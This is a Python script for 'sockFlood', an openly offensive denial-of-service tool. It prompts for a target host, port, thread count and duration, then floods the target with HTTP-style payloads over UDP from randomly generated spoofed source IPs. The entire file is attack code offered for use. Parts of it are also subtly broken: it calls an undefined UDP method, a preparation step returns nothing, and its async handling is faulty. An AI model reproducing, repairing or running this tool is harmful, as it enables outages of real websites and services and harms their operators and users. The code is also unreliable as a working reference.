import os
import socket
import string
import asyncio
import random
import time
import ipaddress
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor

try:
    from scapy.all import sr1, IP, ICMP, UDP, TCP, Raw, fuzz, send
except ImportError:
    print(Fore.RED + "[-] ERROR: Scapy is not installed. Please install it using 'pip install scapy' in Termux.")
    exit(1)

class SockFlood:
    def __init__(self):
        os.system("cls" if os.name == "nt" else "clear")
        os.system("title MR - An Advance ----- Tool ")
        self.host = None
        self.portnum = None
        self.threads = None
        self.duration = None
        self.cooldown = 0.0
        self.method = "GET"
        self.headers = ""
        self.use_icmp = False
        self.use_udp = False
        self.quiet = False
        self.use_dns = False
        self.url_path = None
        self.packet_payloads = []
        self.source_ips = []

    def get_user_input(self):
        print(Fore.CYAN + """
        ==================================================
        |        [+] Welcome to the sockFlood V1.0        |
        |         [+] Use at your own discretion          |
        |                   [+] Lobby                    |
        ==================================================
        """)
        self.host = input(Fore.GREEN + " Enter the website or IP address to attack: ")
        try:
            socket.gethostbyname(self.host)
        except socket.error:
            print(Fore.RED + f"[-] ERROR: Could not resolve {self.host}")
            return False

        self.portnum = int(input(Fore.YELLOW + " Enter the port number to attack [default = 80]: ") or 80)
        self.threads = int(input(Fore.YELLOW + " Enter the number of threads [default = 1000]: ") or 1000)
        self.duration = int(input(Fore.YELLOW + " Enter the duration of the attack in seconds [default = 60]: ") or 60)
        self.cooldown = float(input(Fore.YELLOW + " Enter the cooldown time between each thread in seconds [default = 0.0]: ") or 0.0)
        self.quiet = input(Fore.YELLOW + " Enable quiet mode? (y/n) [default = n]: ").strip().lower() == "y"
        self.method = input(Fore.GREEN + " Enter HTTP method for HTTP flooding [default = GET]: ").strip().upper() or "GET"
        self.headers = input(Fore.GREEN + " Enter custom headers for HTTP flooding (format: 'Header1: Value1\\nHeader2: Value2'):\n")
        self.use_icmp = input(Fore.YELLOW + " Use ICMP ping for checking target reachability? (y/n) [default = n]: ").strip().lower() == "y"
        self.use_dns = input(Fore.YELLOW + " Use asynchronous DNS resolution? (y/n) [default = n]: ").strip().lower() == "y"
        self.use_udp = input(Fore.YELLOW + " Use UDP flood attack? (y/n) [default = n]: ").strip().lower() == "y"

        return True

    async def prepare_attack(self):
        try:
            if self.use_dns:
                self.target_ip = await self.resolve_host()
            else:
                self.target_ip = socket.gethostbyname(self.host)

            self.source_ips = [self.generate_random_ip() for _ in range(self.threads)]
            self.url_path = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(1, 10)))

            if self.method == "GET":
                headers = f"GET /{self.url_path} HTTP/1.1\nHost: {self.host}\n{self.headers}\n\n"
            else:
                headers = f"{self.method} /{self.url_path} HTTP/1.1\nHost: {self.host}\n{self.headers}\n\n"

            self.packet_payloads = [headers.encode() for _ in range(self.threads)]

            print(Fore.GREEN + f"[+] Prepared {self.threads} threads for the attack on {self.host}.")
        except (socket.gaierror, PermissionError):
            print(Fore.RED + f"[-] ERROR: Could not resolve {self.host}")

    async def attack(self):
        if not await self.prepare_attack():
            return

        loop = asyncio.get_event_loop()
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            tasks = [loop.run_in_executor(executor, self.send_packet, idx) for idx in range(self.threads)]
            await asyncio.gather(*tasks)

    def send_packet(self, idx):
        try:
            source_ip = self.source_ips[idx]
            source_port = random.randint(1024, 65535)
            byt = self.packet_payloads[idx]

            if self.use_udp:
                self.send_udp_packets(source_ip, self.target_ip, source_port, byt)
            else:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    sock.bind((source_ip, source_port))
                    while True:
                        sock.sendto(byt, (self.target_ip, self.portnum))
                        if self.cooldown > 0:
                            time.sleep(self.cooldown)
        except Exception:
            pass

    async def resolve_host(self):
        try:
            return (await asyncio.get_event_loop().getaddrinfo(self.host, None, proto=socket.IPPROTO_IP))[0][4][0]
        except (socket.gaierror, PermissionError):
            raise

    def generate_random_ip(self):
        return str(ipaddress.IPv4Address(random.getrandbits(32)))

    def ping_target(self):
        try:
            ping_pkt = IP(dst=self.host) / ICMP()
            reply = sr1(ping_pkt, timeout=2, verbose=0)
            if reply is not None:
                print(Fore.GREEN + f"[+] Target {self.host} is reachable.")
                return True
            else:
                print(Fore.RED + f"[-] ERROR: Target {self.host} is unreachable.")
                return False
        except Exception:
            print(Fore.RED + f"[-] ERROR: Could not ping target {self.host}.")
            return False

    def display_stats(self, start_time):
        try:
            while time.time() - start_time < self.duration:
                elapsed_time = int(time.time() - start_time)
                packets_sent = self.threads * elapsed_time
                if not self.quiet:
                    print(Fore.WHITE + f"[*] Sent {packets_sent} packets in {elapsed_time} seconds.")
                time.sleep(1)
        except KeyboardInterrupt:
            pass

    def start_attack(self):
        if not self.ping_target():
            return

        print(Fore.YELLOW + "Are you sure you want to start the attack? (y/n)")
        confirmation = input().strip().lower()
        if confirmation != "y":
            print(Fore.YELLOW + "Attack cancelled.")
            return

        print(Fore.GREEN + f"[*] Starting attack on {self.host} for {self.duration} seconds with {self.threads} threads...")
        start_time = time.time()
        loop = asyncio.get_event_loop()
        try:
            loop.run_until_complete(asyncio.gather(self.attack(), self.display_stats(start_time)))
        finally:
            loop.close()
        print(Fore.WHITE + "[+] Attack completed.")

if __name__ == "__main__":
    sock_flood = SockFlood()
    if sock_flood.get_user_input():
        sock_flood.start_attack()
